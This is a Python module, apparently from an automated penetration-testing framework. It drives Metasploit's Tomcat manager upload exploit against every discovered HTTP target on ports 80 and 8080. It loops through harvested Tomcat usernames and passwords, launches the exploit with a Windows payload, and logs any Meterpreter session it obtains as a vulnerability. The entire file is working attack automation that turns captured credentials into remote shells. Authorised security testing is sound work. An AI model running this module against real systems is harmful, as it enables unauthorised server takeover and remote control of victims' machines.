import re

from core.keystore import KeyStore
from core.msfActionModule import MsfActionModule


class exploit_msf_tomcat_mgr_upload(MsfActionModule):
    def __init__(self, config, display, lock):
        super(exploit_msf_tomcat_mgr_upload, self).__init__(config, display, lock)
        self.triggers = ["newTomcatPassword"]
        self.requirements = ["msfconsole"]
        self.types = ["http"]
        self.title = "Attempt to gain shell via Tomcat"
        self.shortName = "MSFTomcatMgrUpload"
        self.description = "execute [exploit/multi/http/tomcat_mgr_upload] on each target"
        self.safeLevel = 3

    def getTargets(self):
        self.targets = KeyStore.get('service/http', 'port/tcp/80', 'port/tcp/8080')

    def process(self):
        self.getTargets()
        if len(self.targets) > 0:
            callFire = False
            for t in self.targets:
                ports = KeyStore.get(f'service/http/{t}/tcp')
                for p in ports:
                    users = KeyStore.get(f"creds/service/tomcat/{t}/tcp/{p}/username")
                    for user in users:
                        passwords = KeyStore.get(f"creds/service/tomcat/{t}/tcp/{p}/username/{user}/password")
                        for password in passwords:
                            if not self.seentarget(t + p + user + password):
                                self.addseentarget(t + p + user + password)
                                cmd = {'config': ["use exploit/multi/http/tomcat_mgr_upload", f"set RHOST {t}",
                                                  f"set RPORT {p}", f"set HTTPUSERNAME {user}",
                                                  f"set HTTPPASSWORD {password}", "set fingerprintcheck false",
                                                  "set target 2"], 'payload': 'win'}

                                result, outfile = self.execute_msf(t, cmd)
                                parts = re.findall(".*Meterpreter session.*", result)
                                for part in parts:
                                    callFire = True
                                    self.addVuln(t, self.shortName, {"port": p, "username": user, "password": password,
                                                                     "output": outfile.replace("/", "%2F")})

            if callFire:
                self.fire("msfSession")
        return
